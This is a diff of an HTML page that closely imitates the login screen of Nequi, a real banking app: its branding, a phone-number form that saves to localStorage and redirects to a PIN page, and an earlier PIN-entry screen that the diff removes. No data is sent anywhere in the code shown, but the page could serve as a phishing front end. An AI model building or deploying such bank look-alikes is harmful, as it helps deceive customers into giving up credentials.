@@ -1,54 +1,214 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>NEQUIJS</title>
-  <link rel="stylesheet" href="styles.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nequi Clone</title>
+    <style>
+        /* Estilos generales */
+        body {
+            margin: 0;
+            font-family: 'Roboto', Arial, sans-serif;
+            background-color: #2E003E; /* Fondo morado */
+            color: #FFFFFF; /* Texto blanco */
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: space-between;
+            height: 100vh;
+        }
+
+        /* Encabezado */
+        header {
+            width: 100%;
+            padding: 10px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .icon {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .dynamic-key {
+            background-color: #4C004F;
+            border-radius: 15px;
+            padding: 5px 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            box-shadow: 0px 2px 5px rgba(0, 0, 0, 0.2);
+        }
+
+        .dynamic-key span {
+            font-size: 0.9rem;
+        }
+
+        .dynamic-key button {
+            background: none;
+            border: none;
+            color: #FFFFFF;
+            font-size: 1rem;
+            cursor: pointer;
+        }
+
+        /* Logo central */
+        .logo {
+            margin-top: 50px;
+            font-size: 3rem;
+            font-weight: bold;
+        }
+
+        .logo .pink-dot {
+            color: #FF0066;
+        }
+
+        /* Formulario */
+        .form {
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+        }
+
+        .form input {
+            width: 100%;
+            padding: 15px;
+            margin: 10px 0;
+            border: 1px solid #FF0066;
+            border-radius: 10px;
+            background-color: #3A004F;
+            color: #FFFFFF;
+            font-size: 1rem;
+            box-shadow: 0px 2px 5px rgba(0, 0, 0, 0.2);
+        }
+
+        .form input::placeholder {
+            color: #BBA8C1;
+        }
+
+        .form .hint {
+            font-size: 0.8rem;
+            color: #FF6666;
+            margin-bottom: 10px;
+        }
+
+        .form button {
+            width: 100%;
+            padding: 15px;
+            background-color: #FF0066;
+            color: #FFFFFF;
+            border: none;
+            border-radius: 10px;
+            font-size: 1.2rem;
+            cursor: pointer;
+            box-shadow: 0px 3px 6px rgba(0, 0, 0, 0.3);
+            transition: background-color 0.3s;
+        }
+
+        .form button:hover {
+            background-color: #E6005C;
+        }
+
+        /* Footer */
+        footer {
+            display: flex;
+            justify-content: space-around;
+            width: 100%;
+            padding: 10px;
+            background-color: #3A004F;
+            font-size: 0.9rem;
+        }
+
+        footer div {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        footer span {
+            margin-bottom: 5px;
+        }
+    </style>
 </head>
 <body>
-  <!-- Pantalla de Inicio -->
-  <div id="inicio" class="container">
-    <div class="logo">NEQUIJS</div>
-    <div class="input-group">
-      <label for="phone">Número de celular:</label>
-      <input type="tel" id="phone" maxlength="10" placeholder="Escribe tu número de celular">
-    </div>
-    <button class="button" onclick="goToPin()">Siguiente</button>
-  </div>
+    <header>
+        <div class="icon">
+            <span>❓</span>
+            <span>🛡️</span>
+        </div>
+        <div class="dynamic-key">
+            <span>Clave dinámica</span>
+            <strong>585367</strong>
+            <button>📋</button>
+        </div>
+    </header>
 
-  <!-- Pantalla del PIN -->
-  <div id="pin" class="container" style="display: none;">
-    <h1>Escribe tu clave</h1>
-    <div class="pin-inputs">
-      <input type="password" maxlength="1" id="pin1" oninput="moveToNext('pin1', 'pin2')">
-      <input type="password" maxlength="1" id="pin2" oninput="moveToNext('pin2', 'pin3')">
-      <input type="password" maxlength="1" id="pin3" oninput="moveToNext('pin3', 'pin4')">
-      <input type="password" maxlength="1" id="pin4" oninput="finishPin()">
-    </div>
-    <p class="pin-instruction">No dudamos que seas tú...<br>Pero es mejor confirmar ;)</p>
-    <div class="number-pad">
-      <button onclick="enterNumber(1)">1</button>
-      <button onclick="enterNumber(2)">2</button>
-      <button onclick="enterNumber(3)">3</button>
-      <button onclick="enterNumber(4)">4</button>
-      <button onclick="enterNumber(5)">5</button>
-      <button onclick="enterNumber(6)">6</button>
-      <button onclick="enterNumber(7)">7</button>
-      <button onclick="enterNumber(8)">8</button>
-      <button onclick="enterNumber(9)">9</button>
-      <button onclick="enterNumber(0)">0</button>
-      <button onclick="deleteNumber()">&#x232b;</button>
-    </div>
-    <p class="forgot-pin">¿Se te olvidó?</p>
-  </div>
+    <main>
+        <div class="logo">
+            <span class="pink-dot">•</span>Nequi
+        </div>
 
-  <!-- Mensaje de confirmación -->
-  <div id="confirmation" class="container" style="display: none;">
-    <h1>¡Cuenta activada!</h1>
-    <p>Activa tu cuenta con <strong>José Master</strong></p>
-  </div>
+        <form class="form" onsubmit="handleSubmit(event)">
+            <div>
+                <input id="phoneNumber" type="text" placeholder="Número de celular" required />
+            </div>
+            <div class="hint">Escribe porfa el número de tu cel para seguir.</div>
+            <button type="submit">Entra</button>
+        </form>
+        
+        <script>
+            function handleSubmit(event) {
+                event.preventDefault(); // Evita el envío normal del formulario
+                const phoneNumber = document.getElementById('phoneNumber').value;
+                
+                // Guarda el número en localStorage
+                localStorage.setItem('phoneNumber', phoneNumber);
+                
+                // Redirige a la página de clave
+                window.location.href = 'clave.html';
+            }
+        </script>
+        
+    
+    
+        
+        
+        <script>
+            function handleSubmit(event) {
+                event.preventDefault(); // Evita el envío normal del formulario
+                const phoneNumber = document.getElementById('phoneNumber').value;
+                
+                // Guarda el número en localStorage
+                localStorage.setItem('phoneNumber', phoneNumber);
+                
+                // Redirige a la página de clave
+                window.location.href = 'clave.html';
+            }
+        </script>
+        
 
-  <script src="script.js"></script>
+
+
+
+    
+    
+    </main>
+
+    <footer>
+        <div>
+            <span>📱</span>
+            <span>Usa tu QR</span>
+        </div>
+        <div>
+            <span>🖧</span>
+            <span>Paga en Datáfono</span>
+        </div>
+        <div>
+            <span>by ⚪</span>
+        </div>
+    </footer>
 </body>
 </html>
